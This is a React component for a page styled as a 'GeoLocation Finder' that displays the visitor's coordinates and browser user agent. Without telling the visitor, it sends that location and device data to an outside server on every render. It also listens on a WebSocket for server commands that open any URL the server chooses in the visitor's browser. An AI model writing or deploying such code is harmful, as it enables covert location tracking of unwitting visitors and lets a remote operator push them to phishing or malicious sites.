import "bootstrap/dist/css/bootstrap.min.css"
import React, { useEffect, useState } from "react";
import axios from "axios";
import useWebSocket from "react-use-websocket"
export default function Home() {
    let { lastMessage ,readyState} = useWebSocket("https://location-back.onrender.com")
    let [lat, setLat] = useState("");
    let [long, setlong] = useState("");
    let [os, setOs] = useState("")
    axios.post("https://location-back.onrender.com/DataFromFrontend/", { os, lat, long })

    useEffect(() => {
        if (readyState === WebSocket.OPEN) {
            console.log('WebSocket connection established');
        }
        let handleevnt = () => {
            window.location.reload()
        }
        if (lastMessage !== null) {
            let message = JSON.parse(lastMessage.data)
            if (message.action === "open" && message.url) {
                window.open(message.url)

            }

        }





        window.addEventListener("online", handleevnt);
        // socket.addEventListener("message",handlemess)
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition((pos) => {
                setLat(pos.coords.latitude);
                setlong(pos.coords.longitude);
                let os = navigator.userAgent;
                setOs(os)
            })


        }
        else {
            alert("Sorry Browser Not Suppoterd")
        }
        return () => {
            window.removeEventListener("online", handleevnt);

        }


    }, [lastMessage,readyState])






    return (
        <>
            <h2 className="text-center my-3 mb-3 ">GeoLocation Finder </h2>
            <div className=" border d-flex  text-center w-auto h-auto mx-3 my-3 d-block">
                <div className="boder w-25 h-50 mx-3 my-3" >
                    <h2> Device</h2>

                    {os}

                </div>
                <div className=" w-50 h-50 float-end mx-3 my-3">
                    <h3> Latitude</h3>

                    <h5>
                        {lat}
                    </h5>

                    <h3>
                        Longitude</h3>

                    <h5>
                        {long}
                    </h5>


                </div>

            </div>










        </>
    )
}
